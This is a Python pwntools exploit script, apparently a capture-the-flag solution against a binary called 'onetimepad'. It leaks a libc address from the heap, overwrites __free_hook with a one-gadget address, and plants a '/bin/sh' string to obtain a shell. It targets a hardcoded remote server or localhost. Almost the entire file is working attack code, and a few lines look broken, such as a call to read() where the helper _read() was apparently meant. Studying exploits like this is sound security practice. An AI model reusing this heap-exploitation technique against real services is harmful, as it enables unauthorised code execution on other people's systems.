#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./onetimepad"

#onegadgets = [0x4484f,0x448a3,0xe5456]
onegadgets = [0x4f2c5,0x4f322,0x10a38c]

#online
#st = 1.0

#local
st = 0.1

arena_off = 0x3ebc40+96#0x1bbca0
malloc_hook_off = 0x3ebc30#0x1bbc30
free_hook_off = 0x3ED8E8
pop_rdx = 0x00001b96


rhp1 = {"host":"88.198.154.140","port":31336}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def _write(conn,content):
  conn.recvuntil("> ")
  conn.sendline("w")
  sleep(st)
  conn.sendline(content)

def _read(conn,idx):
  conn.recvuntil("> ")
  conn.sendline("r")
  sleep(st)
  conn.sendline(str(idx))

def _rewrite(conn,idx,content):
  conn.recvuntil("> ")
  conn.sendline("e")
  sleep(st)
  conn.sendline(str(idx))
  sleep(st)
  conn.sendline(content)



#getline()で作るbufの大きさってどうやって決まるんだ?
#2のべき乗っぽいのかな
def exploit(conn):
  _write(conn,"A"*0x610) #0:とりあえずline bufを大きく取るため
  _write(conn,"B"*0x560) #1:to generate arena+96
  _write(conn,"C"*0x20) #2
  _write(conn,"D"*0x20) #3
 
  _read(conn,1)
  _read(conn,3)
  _read(conn,2)
  print("[+]read three times")


  _rewrite(conn,2,"")
  _write(conn,"E"*0x20) #1
  _write(conn,"F"*0x20) #2

  _write(conn,"G"*0x4e0) #3

  _read(conn,3)
  _read(conn,2)
  arena96 = unpack(conn.recvline()[:-1].ljust(8,'\x00'))
  print("[+]main_arena + 96: "+hex(arena96))
  libc_base = arena96 - arena_off 
  print("[+]libc_base: "+hex(libc_base))
  malloc_hook = libc_base + malloc_hook_off
  print("[+]malloc_hook: "+hex(malloc_hook))
  free_hook = libc_base + free_hook_off
  print("[+]free_hook: "+hex(free_hook))
  print("[+]onegadgets[0]: "+hex(libc_base + onegadgets[0]))

  _write(conn,"G"*0x4e0) #2
  _write(conn,p64(free_hook - (0x70-0x6))) #3
  print("[+]stage1 OK")
  inj = "/bin"
  inj += "/"*(0x70-(len(inj)+len("sh")))
  inj += "sh"
  _write(conn,inj) #4
  print("[+]stage2 OK")
  
  inj = "A"*(0x70-0x6)
  inj += p64(libc_base + onegadgets[0])
  _write(conn,inj) #5

  raw_input()
  read(conn,4)
  #_write(conn,"GO!!")

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
    st = 1.0
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

